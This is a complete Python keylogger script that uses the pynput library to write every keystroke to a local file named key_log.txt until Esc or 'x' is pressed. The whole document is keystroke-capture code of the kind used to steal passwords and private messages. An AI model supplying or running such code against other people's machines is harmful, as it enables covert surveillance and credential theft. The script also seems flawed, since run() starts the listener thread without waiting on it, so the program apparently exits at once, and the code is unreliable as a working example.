import os
from pynput import keyboard

class KeyLogger:
    def __init__(self, log_file="key_log.txt"):
        self.log_file = log_file
        self.listener = None

    def on_key_press(self, key):
        try:
            with open(self.log_file, "a") as file:
                file.write('{0}\n'.format(key.char))
        except AttributeError:
            with open(self.log_file, "a") as file:
                file.write('{0}\n'.format(key))

    def on_key_release(self, key):
        if key == keyboard.Key.esc or (hasattr(key, 'char') and key.char == 'x'):
            print("Key logging stopped.")
            self.stop_listening()

    def start_listening(self):
        print("Key logging started. Press 'x' to stop.")
        self.listener = keyboard.Listener(on_press=self.on_key_press, on_release=self.on_key_release)
        self.listener.start()

    def stop_listening(self):
        self.listener.stop()
        self.listener.join()

    def run(self):
        self.start_listening()

def main():
    logger = KeyLogger()
    logger.run()

if __name__ == "__main__":
    main()
